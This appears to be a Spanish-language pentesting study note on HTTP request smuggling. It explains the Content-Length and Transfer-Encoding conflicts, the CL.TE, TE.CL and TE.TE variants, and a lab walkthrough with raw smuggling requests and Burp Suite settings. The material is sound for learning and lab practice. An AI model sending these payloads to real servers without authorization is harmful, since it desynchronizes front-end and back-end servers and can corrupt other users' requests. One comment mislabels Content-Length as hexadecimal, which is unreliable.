# HTTP Smuggling 

Tags: #HTTP_Smuggling #BurpSuite 

```bash 
HTTP Smuggling es una vulnerabilidad que se presenta cuando el inicio y fin de una solicitud HTTP son interpretdos de manera diferente por el frontend y el backend de una aplicación. 


- Content-Length
	POST /search HTTP/1.1
	Host: normal-website.com
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 3     -> Tamaño en hexadecimal 
	
	123      -> 3 bytes 


- Transfer-Encoding:
	POST /search HTTP/1.1
	Host: normal-website.com
	Content-Type: application/x-www-form-urlencoded
	Transfer-Encoding: chunked 
	
	3       -> Tamaño en hexadecimal 
	123     -> 3 bytes (123)
	0       -> Final del chunked 

Notas:
	1. En el final del 'chunked' en la petición de Burpsuite cuando se coloca el 0 se debe de dar clic dos veces al 'Enter = \r\n' para que exista un doble retorno de carro y doble salto de linea 


Riesgo:
Desde HTTP/1.1 existe soporte generalizado para enviar múltiples solicitudes HTTP a través de un único socket TCP. El protocolo es extremadamente simple; las cxolicitudes HTTP se colocan una detrás de la otra, y el servidor analiza los encabezados (Transfer-Encoding o Content-Length) para determinar dónde termina cada una y dónde comienza la siguiente.
```

```bash 
Tipos de HTTP Request Smuggling: Los ataques clásicos de HTTP Request Smuggling implican colocar tanto el encabezado Content-Length como el encabezado Transfer-Encoding en una única solicitud HTTP/1.1 y manipularlos para que los servidores front-end y back-end procesen la solicitud de manera diferente.

La forma exacta en que se hace esto depende del comportamiento de los dos servidores. 

- CL.TE: El servidor del front-end usa el encabezado Content-Length y el servidor de back-end usa el encabezado Transfer-Encoding (Formato chunked o fragmentada)
- TE.CL: El servidor del front-end usa el encabezado Transfer-Encoding (Formato chunked o fragmentada) y el servidor de back-end usa el encabezado Content-Length
- TE.TE: Los servidores fornt-end y back-end admiten el encabezado Transfer-Encoding, pero se puede inducir a uno de los servidores a no procesarlo, ofuscando el encabezado de alguna manera 
```

## Confirmación de CL.TE por respuestas diferenciales

```bash 
En este lab se trabaja con una configuración CL.TE (Content-Length y Transfer-Encoding) donde el servidor frontal no acepta codificación 'chunked', pero el servidor trasero sí lo hace. El objetivo es confirmar si es posible inyectar una petición maliciosa al back-end mediante HTTP request smuggling y observar una diferencia en la respuesta como prueba de éxito.

Para ello, enviamos una primera petición que contiene una carga smuggleada que incluye una petición embebida hacia /404. Si el ataque funciona correctamente, al enviar una segunda petición a la raíz del sitio (/), el servidor responderá con un 404, lo que indica que la petición anterior fue procesada de forma inesperada por el back-end.

Esta técnica se basa en una diferencia en la interpretación de los encabezados 'Content-Length' y 'Transfer-Encoding' entre ambos servidores, lo que permite desincronizar las sesiones HTTP y comprobar la vulnerabilidad a través del comportamiento diferencial.
```

```bash  
<!-- Peticion original --> 

	GET / HTTP/2
	Host: web.com 
	Cookie: session=123456
	User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
	Accept-Encoding: gzip, deflate, br
	Referer: https://portweb.com/
	Sec-Fetch-Dest: document
	Sec-Fetch-Mode: navigate
	Sec-Fetch-Site: cross-site
	Priority: u=0, i
	Te: trailers 
```

```bash  
<!-- Para resolver este lab se debe recargar la página y hacer que aparezca un error 404 --> 

# En esta solicitud el front-end interpreta 'Content-Length' 
	POST / HTTP/1.1
	Host: web.com
	Content-Length: 9
	
	test=test

# En esta solicitud final el front-end solo interpreta 'Content-Length' y cuando lo pase al back-end el interpretará el 'Transfer-Encoding'

	POST / HTTP/1.1 
	Host: web.com 
	Content-Length: 9 
	Transfer-Encoding: chunked 
	
	test=test


Notas:
	1. Cambiar el atributo de HTTP/2 a HTTP 1.1
	2. Cambiar el método de GET a POST
	3. En BurpSuite en la configuración desmarcar la opción 'Update Content-Length' para tomar el control del Content-Length en la petición 
	4. Activar '\r\n' en la petición de BurpSuite 
```

```bash 
<!-- Forma correcta de mandar la data para el front-end y back-end --> 

	POST / HTTP/1.1 
	Host: web.com 
	Content-Length: 14 
	Transfer-Encoding: chunked 
	
	4
	abcd
	0
	

Notas:
	1. El tamaño del 'Content-Length' se puede mirar en BurpSuite seleccionando toda la data del cuerpo y mirando el inspector '14 (0xe)'
```

```bash 
<!-- Forma de acontecer un error y generar una desincronización --> 

	POST / HTTP/1.1 
	Host: web.com 
	Content-Length: 9 
	Transfer-Encoding: chunked 
	
	4
	abcd
	0
	

Notas:
	1. Si se selecciona el '4 y abcd' da un total de 9 bytes por lo que el back-end queda a la espera de nuevo bytes por lo que se genera un 'Connection Timeout' generando un error 500
```

```bash 
<!-- Generar un error especifico como 404 'Not Found' --> 

# Forma 1 inicial:
	POST / HTTP/1.1 
	Host: web.com 
	Content-Length: 5 
	Transfer-Encoding: chunked 
	
	0
	

# Request final en donde el back-end lee la solicitud bien hasta el final del 'chunked' pero al tener una solicitud adicional este la procesa y la deja en cola de espera. Por lo que se procesara y se mirará la respuesta cuando se ingrese una nueva solicitud

	POST / HTTP/1.1 
	Host: web.com 
	Content-Length: 33 
	Transfer-Encoding: chunked 
	
	0
	
	GET /error HTTP/1.1
	Test: A



Notas:
	1. Forma más facil de hacerlo es colocando el 0
	2. Siempre se debe de medir el 'Content-Length'
	3. Para que una solicitud sea valida debe de tener al menos una cabecera y será cualquiera
	4. En la segunda solicitud se tiene que colocar una ruta para que redireccione 
```

```bash 
<!-- Generar un error especifico como 404 'Not Found' --> 

# Forma 2 inicial:
	POST / HTTP/1.1 
	Host: web.com 
	Content-Length: 13 
	Transfer-Encoding: chunked 
	
	3
	abc
	0
	

# Request final en donde el back-end lee la solicitud bien hasta el final del 'chunked' pero al tener una solicitud adicional este la procesa y la deja en cola de espera. Por lo que se procesara y se mirará la respuesta cuando se ingrese una nueva solicitud

	POST / HTTP/1.1 
	Host: web.com 
	Content-Length: 41 
	Transfer-Encoding: chunked 
	
	3
	abc
	0
	
	GET /error HTTP/1.1
	Test: A



Notas:
	1. Forma más facil de hacerlo es colocando el 0
	2. Siempre se debe de medir el 'Content-Length'
	3. Para que una solicitud sea valida debe de tener al menos una cabecera y será cualquiera
	4. En la segunda solicitud se tiene que colocar una ruta para que redireccione
```